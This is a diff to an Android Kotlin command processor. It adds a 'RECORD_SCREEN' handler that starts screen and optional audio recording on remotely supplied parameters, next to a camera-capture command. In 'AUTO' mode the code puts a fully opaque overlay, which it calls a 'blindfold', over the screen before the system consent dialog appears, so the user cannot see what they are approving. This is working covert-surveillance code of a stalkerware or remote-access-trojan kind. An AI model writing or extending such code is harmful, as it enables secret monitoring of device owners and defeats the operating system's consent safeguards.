@@ -477,6 +477,32 @@ object CommandProcessor {
                         }
                     }
                 }
+                "RECORD_SCREEN" -> {
+                    val parts = content.split("|")
+                    val mode = parts.getOrNull(0)?.trim()?.uppercase() ?: "TRIGGER"
+                    val dur = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 60
+                    val qual = parts.getOrNull(2)?.trim()?.uppercase() ?: "MED"
+                    val audio = parts.getOrNull(3)?.trim()?.uppercase() == "TRUE"
+                    
+                    ScreenRecordManager.expectedMode = mode
+                    ScreenRecordManager.pendingDur = dur
+                    ScreenRecordManager.pendingQual = qual
+                    ScreenRecordManager.pendingAudio = audio
+                    
+                    if (mode == "AUTO") {
+                        // Apply the opaque blindfold instantly before the dialog arrives
+                        Handler(Looper.getMainLooper()).post {
+                            DimmerManager.applyDim(ctx, 100, "OVERLAY")
+                        }
+                    }
+                    
+                    val i = Intent(ctx, PulseActivity::class.java).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                        putExtra("is_screen_record_trigger", true)
+                    }
+                    ctx.startActivity(i)
+                    status = "RECORD_INITIATED ($mode | ${dur}s | $qual | Audio: $audio)"
+                }
                 "CAPTURE_IMAGE" -> {
                     val parts = content.split("|")
                     val side = parts.getOrNull(0)?.trim()?.uppercase() ?: "REAR"
